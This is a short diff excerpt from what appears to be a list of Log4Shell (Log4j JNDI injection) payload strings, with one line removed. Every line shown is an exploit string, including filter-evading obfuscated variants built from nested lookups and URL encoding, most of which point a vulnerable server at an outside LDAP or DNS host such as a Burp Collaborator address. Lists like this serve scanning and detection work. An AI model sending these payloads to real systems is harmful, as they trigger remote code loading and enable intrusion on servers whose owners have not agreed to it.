@@ -25,7 +25,6 @@ ${jndi:dns://aeutbj.example.com/ext}
 ${jndi:${lower:l}${lower:d}a${lower:p}://example.com/
 ${jndi:ldap://127.0.0.1:1389/i_rock}
 ${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//your.burpcollaborator.net/a}
-${jndi:ldap://aa895bba3900.bingsearchlib.com:39356/a}
 /$%7Bjndi:ldap://127.0.0.1:1389/Exploit%7D
 /$%7Bjndi:ldap://x-ios-validation.com.lc1wnt7yguuuk0qurdw600boffl59u.burpcollaborator.net%7D
 jn${env::-}di:
